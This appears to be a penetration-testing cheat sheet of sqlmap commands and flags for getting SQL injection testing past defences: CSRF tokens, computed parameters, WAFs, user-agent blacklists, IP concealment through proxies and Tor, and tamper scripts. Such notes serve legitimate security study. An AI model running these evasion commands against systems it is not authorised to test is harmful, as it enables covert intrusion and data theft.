## Anti-CSRF Token Bypass
--csrf-token
```shell-session
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

## Unique Value Bypass
```shell-session
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

## Calculated Parameter Bypass
Sometimes, a parameter is calculated by another parameter. In this case, use --eval.
```shell-session
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

## IP Address Concealing
--proxy (e.g. --proxy="sock4://177.39.187.70:33283") (add a working proxy before)
--proxy-file (list of proxies)
--tor (use tor)
--check-tor (to see if connected to tor properly)

## WAF Bypass
--skip-waf

## User-agent Blacklisting Bypass
--random-agent

## Tamper Scripts
--tamper (--tamper=between,randomcase)
--list-tampers
- 0eunion
- base64encode
- between
- commalesslimit
- equaltolike
- halfversionedmorekeywords
- modsecurityversioned
- percentage
- plus2concat
- randomcase
- space2comment
- space2dash
- space2hash
- space2mssqlblank
- space2plus
- space2randomblank
- symboliclogical
- versionedkeywords
- versionmorekeywords

## Miscellaneous Bypasses
--chunked (chunked transfer encoding and HTTP parameter pollution)
